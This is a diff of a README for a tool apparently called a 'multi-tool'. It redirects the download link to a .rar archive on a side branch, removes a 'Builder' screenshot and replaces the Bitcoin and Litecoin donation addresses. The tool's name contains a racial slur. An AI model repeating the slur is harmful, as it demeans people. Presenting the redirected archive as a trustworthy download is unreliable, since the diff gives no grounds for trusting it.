@@ -25,7 +25,6 @@
   <img src="Img/Elliotniggerson.png" width="49%"> 
   <img src="Img/Elliotniggerson-2.png" width="49%"> 
   <img src="Img/Elliotniggerson-3.png" width="49%"> 
-  <img src="Img/Builder.png" width="49%">
   <br><br>
 </p>
 
@@ -154,7 +153,7 @@
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/crashoutt/elliotmulti-tool">Dowloads "Elliotniggerson-Tools.zip" Here</a>
+<a href="https://github.com/crashoutt/elliotmulti-tool/blob/other/Elliot-Main.rar">Dowloads "Elliotniggerson-Tools.zip" Here</a>
 
 <p>
   
@@ -191,11 +190,11 @@ Or
   
   <strong>Bitcoin Adress:</strong>
   ``` 
-1MSRzopmhasr9ByHBrksScqv6wByVagDKe
+bc1qysukl28r800skaspsym70y5tn8tl2x49tfgs32
   ```
   <strong>Litecoin Adress:</strong>
   ```
-LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
+LbnsCyuY7MXpSvXhUN5kyoC86f8VMHPSiD
   ```
 
 </p>
